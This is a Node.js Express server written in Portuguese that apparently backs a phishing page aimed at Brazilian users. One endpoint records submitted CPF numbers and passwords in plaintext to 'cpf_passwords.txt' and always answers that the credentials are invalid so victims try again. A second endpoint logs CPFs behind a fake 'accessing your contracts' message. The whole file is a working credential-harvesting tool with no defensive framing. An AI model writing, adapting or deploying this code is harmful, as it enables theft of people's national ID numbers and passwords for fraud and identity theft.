const express = require('express');
const cors = require('cors');
const fs = require('fs'); 
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;
const NOME_ARQUIVO_LOG = 'cpf_passwords.txt';

app.use(cors());
app.use(express.json()); 
app.use(express.static(path.join(__dirname, 'public')));

app.post('/salvar-dados', (req, res) => {
    const { cpf, senha } = req.body;

    if (!cpf || !senha) {
        return res.status(400).json({ message: "Dados incompletos." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[${dataHora}] - CPF: ${cpf} | Senha: ${senha}\n`;

    console.log('Dados recebidos:', linhaDeLog.trim());

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ERRO AO SALVAR NO ARQUIVO:', err);
            return res.status(500).json({ message: 'Erro interno no servidor.' });
        }
        console.log('Dados salvos com sucesso em', NOME_ARQUIVO_LOG);
    });


    res.status(401).json({ message: 'CPF ou senha inválidos. Tente novamente.' });
});

app.post('/acessar-contratos', (req, res) => {
    const { cpf } = req.body;

    if (!cpf) {
        return res.status(400).json({ message: "CPF é obrigatório." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[CONTRATOS - ${dataHora}] - CPF: ${cpf}\n`;

    console.log('Dados de Contratos recebidos:', linhaDeLog.trim());

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ERRO AO SALVAR NO ARQUIVO:', err);
            return res.status(500).json({ message: 'Erro interno no servidor.' });
        }
        console.log('CPF de Contratos salvo com sucesso em', NOME_ARQUIVO_LOG);
    });

    res.status(200).json({ message: 'Acessando seus contratos. Por favor, aguarde...' });
});
app.listen(port, () => {
    console.log(`Servidor funcional rodando em http://localhost:${port}`);
    console.log(`Aguardando dados... tudo sera mandado para: "${NOME_ARQUIVO_LOG}"`);
});
